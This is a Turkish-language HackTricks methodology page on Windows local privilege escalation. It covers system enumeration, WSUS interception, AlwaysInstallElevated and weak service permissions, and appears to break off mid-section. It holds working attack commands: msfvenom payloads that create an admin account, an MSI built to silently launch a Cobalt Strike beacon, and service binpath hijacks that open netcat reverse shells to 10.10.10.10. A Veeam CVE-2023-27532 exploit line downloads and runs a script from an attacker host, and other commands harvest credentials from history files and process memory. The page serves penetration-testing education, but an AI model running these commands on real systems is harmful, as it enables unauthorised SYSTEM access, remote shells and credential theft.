# Windows Yerel Ayrıcalık Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows Temel Teorisi

### Erişim Token'ları

**Windows Access Tokens'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Seviyeleri

**Windows'taki bütünlük seviyelerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okumalısınız:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta sistemin **enumere edilmesini engelleyebilecek**, yürütülebilir dosyaların çalıştırılmasını engelleyebilecek veya hatta aktivitelerinizi **tespit edebilecek** farklı unsurlar vardır. Ayrıcalık yükseltme enumerasyonuna başlamadan önce aşağıdaki **sayfayı** **okumalı** ve tüm bu **savunma** **mekanizmalarını** **enumerate** etmelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

AppInfo secure-path kontrolleri atlatıldığında, `RAiLaunchAdminProcess` aracılığıyla başlatılan UIAccess süreçleri, prompt olmadan High IL'ye ulaşmak için kötüye kullanılabilir. İlgili UIAccess/Admin Protection bypass iş akışını burada kontrol edin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## Sistem Bilgisi

### Sürüm bilgisi enumerasyonu

Windows sürümünün bilinen bir zafiyeti olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunuyor; bu da bir Windows ortamının sunduğu **büyük saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson'ı barındırır)_

**Yerelde (sistem bilgisi ile)**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lerin GitHub repoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Herhangi bir credential/Juicy bilgi env variables içinde kayıtlı mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi şu adreste öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin bölümleri gibi bilgiler dahil edilir. Ancak, tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için belgelerdeki "Transcript files" bölümündeki talimatları izleyin; **"Module Logging"**'i **"Powershell Transcription"** yerine seçin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs'tan son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betik yürütülmesinin tüm etkinlik ve içerik kaydı yakalanır; her bir kod bloğunun çalışırken belgelendiği garanti edilir. Bu süreç, her etkinliğe ait kapsamlı bir denetim izi (audit trail) korur ve adli inceleme ile kötü amaçlı davranışların analizinde değerlidir. Yürütme sırasında tüm etkinlikleri belgelendirerek sürece ilişkin ayrıntılı içgörüler sağlar.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için olay kayıtları Windows Event Viewer'da şu konumda bulunur: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http ile talep ediliyorsa sistemi ele geçirebilirsiniz.

Başlamak için ağın SSL olmayan bir WSUS güncellemesi kullanıp kullanmadığını cmd'de aşağıdakini çalıştırarak kontrol edersiniz:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdaki:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Aşağıdakilerden biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman, **istismar edilebilir.** Eğer son kayıt değeri 0 ise, WSUS girdisi yok sayılacaktır.

Bu zafiyeti istismar etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hatanın istismar ettiği zafiyet şudur:

> Eğer yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates Internet Explorer’ın ayarlarında yapılandırılan proxy’yi kullanıyorsa, bu durumda [PyWSUS](https://github.com/GoSecure/pywsus)’u yerel olarak çalıştırıp kendi trafiğimizi yakalayabilir ve hedef makinemizde yükseltilmiş bir kullanıcı olarak kod çalıştırabiliriz.
>
> Ayrıca, WSUS servisi mevcut kullanıcının ayarlarını kullandığı için sertifika deposunu da kullanır. Eğer WSUS hostname’i için kendi imzalı bir sertifika oluşturup bu sertifikayı mevcut kullanıcının sertifika deposuna eklerseniz, hem HTTP hem de HTTPS WSUS trafiğini yakalayabileceksiniz. WSUS, sertifika üzerinde trust-on-first-use türü bir doğrulamayı uygulamak için HSTS-benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güveniliyorsa ve doğru hostname’e sahipse, servis tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla istismar edebilirsiniz (kullanılabilir olduğunda).

## Üçüncü Taraf Auto-Updaters ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir update kanalı açar. Eğer enrollment saldırgan sunucusuna zorlanabiliyorsa ve updater sahte bir root CA’ya veya zayıf imzalayıcı kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM servisi tarafından kurulacak kötü amaçlı bir MSI teslim edebilir. Genelleştirilmiş bir teknik (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) için bkz:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` localhost üzerinde **TCP/9401**'de, saldırgan kontrollü mesajları işleyen bir servis açar; bu da **NT AUTHORITY\SYSTEM** olarak keyfi komutlar çalıştırmaya izin verir.

- **Recon**: dinleyiciyi ve sürümü doğrulayın, ör., `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: aynı dizine gerekli Veeam DLL'leri ile birlikte bir PoC (ör. `VeeamHax.exe`) yerleştirin, ardından yerel soket üzerinden bir SYSTEM payload tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Servis komutu SYSTEM hesabı olarak yürütür.

## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** zafiyeti vardır. Bu koşullar, **LDAP signing is not enforced,** olan ortamlar; kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren self-rights'e sahip olmaları; ve kullanıcıların domain içinde bilgisayar oluşturabilme yetkisine sahip olmalarını içerir. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını belirtmek önemlidir.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Eğer** bu 2 kayıt **etkinse** (değer **0x1**), o zaman her düzeydeki kullanıcı `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Meterpreter oturumunuz varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz

### PowerUP

Mevcut dizin içinde ayrıcalıkları yükseltmek için bir Windows MSI ikili dosyası oluşturmak üzere power-up'tan `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme isteyen önceden derlenmiş bir MSI yükleyicisi yazar (dolayısıyla GIU erişimine ihtiyacınız olacak):
```
Write-UserAddMSI
```
Oluşturulan binary'i çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu öğreticiyi okuyarak bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenin. Sadece komut satırlarını çalıştırmak istiyorsanız bir "**.bat**" dosyasını sarmalayabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumuna yeni bir **Windows EXE TCP payload** oluşturun.
- **Visual Studio**'u açın, **Create a new project** seçeneğini seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye bir ad verin (ör. **AlwaysPrivesc**), konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- Dahil edilecek dosyaları seçtiğiniz 4 adımlı sürecin 3. adımına gelene kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer** içinde **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform**'u **x86**'dan **x64**'e değiştirin.
- Yüklenecek uygulamayı daha meşru gösterebilecek **Author** ve **Manufacturer** gibi değiştirebileceğiniz diğer özellikler vardır.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install** üzerine sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder** üzerine çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, yükleyici çalıştırıldığında beacon payload'un anında çalıştırılmasını sağlar.
- **Custom Action Properties** altında **Run64Bit**'i **True** olarak değiştirin.
- Son olarak, projeyi derleyin.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Zararlı `.msi` dosyasının **yüklemesini** **arka planda** yürütmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti istismar etmek için kullanabileceğiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Dedektörler

### Denetim Ayarları

Bu ayarlar neyin **kaydedildiğine** karar verir, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek ilginç.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, etki alanına katılmış bilgisayarlarda her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmesini** sağlayarak **yerel Administrator parolalarının yönetimi** için tasarlanmıştır. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; böylece yetkilendirildiklerinde yerel admin parolalarını görüntüleyebilirler.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **plain-text parolalar LSASS içinde saklanır** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Windows 8.1'den başlayarak, Microsoft, Local Security Authority (LSA) için güvenilmeyen süreçlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla geliştirilmiş bir koruma getirdi ve böylece sistemi daha da güvenli hale getirdi.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** Windows 10'da tanıtıldı. Amacı, bir cihazda saklanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** işletim sistemi bileşenleri tarafından kullanılmak üzere **Local Security Authority** (LSA) tarafından doğrulanır. Bir kullanıcının logon verileri kayıtlı bir registered security package tarafından doğrulandığında, genellikle o kullanıcı için domain credentials oluşturulur.\
[**Cached Credentials hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar & Gruplar

### Kullanıcıları & Grupları Listeleme

Bulunduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **herhangi bir ayrıcalıklı grubun üyesiyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları ayrıcalık yükseltmek için nasıl kötüye kullanacağınızı öğrenin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

**Daha fazlasını öğrenin** bu sayfada bir **token**'ın ne olduğunu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfayı inceleyin **ilginç token'lar** hakkında bilgi edinmek ve bunları nasıl kötüye kullanacağınızı öğrenmek için:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ev klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Pano içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Her şeyden önce, süreçleri listeleyerek **sürecin komut satırında şifreler olup olmadığını kontrol edin**.\
Çalışan bazı binary'leri **üzerine yazıp yazamayacağınızı** veya binary klasörünün yazma izinlerine sahip olup olmadığınızı kontrol edin; böylece olası [**DLL Hijacking attacks**](dll-hijacking/index.html) saldırılarını istismar edebilirsiniz:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman olası [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin.

**Süreçlerin ikili (binary) dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Süreçlerin binaries klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Çalışan bir sürecin bellek dökümünü almak için sysinternals'tan **procdump** kullanabilirsiniz. FTP gibi servislerin belleklerinde **credentials in clear text in memory** bulunur; bellek dökümünü alıp bu credentials'ları okuyun.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

## Servisler

Service Triggers, belirli koşullar oluştuğunda Windows'un bir servis başlatmasına izin verir (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). SERVICE_START haklarına sahip olmasanız bile genellikle tetiklerini çalıştırarak ayrıcalıklı servisleri başlatabilirsiniz. Sıralama ve aktivasyon tekniklerini burada görebilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

Servislerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc**'yi kullanabilirsiniz.
```bash
sc qc <service_name>
```
Her hizmet için gerekli ayrıcalık seviyesini kontrol etmek amacıyla _Sysinternals_'ten **accesschk** ikili dosyasına sahip olmak önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
“Authenticated Users”'in herhangi bir servisi değiştirebilip değiştiremeyeceğini kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[accesschk.exe'yi XP için buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştir

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Servis başlatılamıyor; ya devre dışı bırakılmış ya da ona bağlı etkin cihazları yok._

Bunu etkinleştirmek için şunu kullanabilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**

**Bu sorunun başka bir geçici çözümü** şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Servis çalıştırılabilir dosya yolunu değiştirme**

Bu senaryoda, "Authenticated users" grubunun bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olması durumunda, servisin çalıştırılabilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: service binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasına olanak tanır; bu da service yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: service yapılandırmalarını değiştirme yeteneğini miras alır.
- **GENERIC_ALL**: service yapılandırmalarını değiştirme yeteneğini de miras alır.

Bu açığın tespiti ve sömürülmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Service binary'lerinin zayıf izinleri

**Bir service tarafından çalıştırılan binary'yi değiştirebilip değiştiremeyeceğinizi kontrol edin** veya binary'nin bulunduğu klasörde **yazma izniniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** ile (system32 içinde değil) alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls**'i de kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defteri düzenleme izinleri

Herhangi bir servis kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol edebilirsiniz** şu şekilde:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin `Path`'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory izinleri

Eğer bir kayıt defteri üzerinde bu izne sahipseniz, bu **bu kayıt defterinden alt kayıt defterleri oluşturabileceğiniz** anlamına gelir. Windows servisleri durumunda bu, **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir çalıştırılabilir dosyanın yolu tırnak içinde değilse, Windows boşluktan önce gelen her olası yol parçasını çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolunda Windows şu dosyaları çalıştırmayı dener:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak işareti olmayan tüm hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
